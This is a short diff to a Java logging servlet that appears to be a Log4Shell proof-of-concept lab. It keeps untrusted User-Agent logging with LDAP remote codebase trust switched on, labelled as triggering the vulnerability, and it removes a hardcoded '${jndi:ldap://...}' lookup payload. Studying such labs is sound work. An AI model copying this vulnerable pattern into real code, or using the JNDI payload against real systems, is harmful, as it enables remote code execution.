@@ -35,11 +35,8 @@ public class Logging extends HttpServlet {
 		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
 		logger.trace("Entering application...");
 
-		logger.info("Hello Log4j2...");
-		//logger.error("Something is wrong with this code", new Exception("Invalid message"));
+		// this will trigger the log4j vulnerability
 		logger.info("User-Agent: --- "+request.getHeader("User-Agent"));
-		logger.info(System.getProperty("jndiUrl"));
-		logger.info("${jndi:ldap://log4j-ldap.log4j.svc.cluster.local:1389/Log4jpoc}");
 		logger.trace("Exiting application...");
 		response.getWriter().append("Served At: ").append(request.getContextPath());
 	}
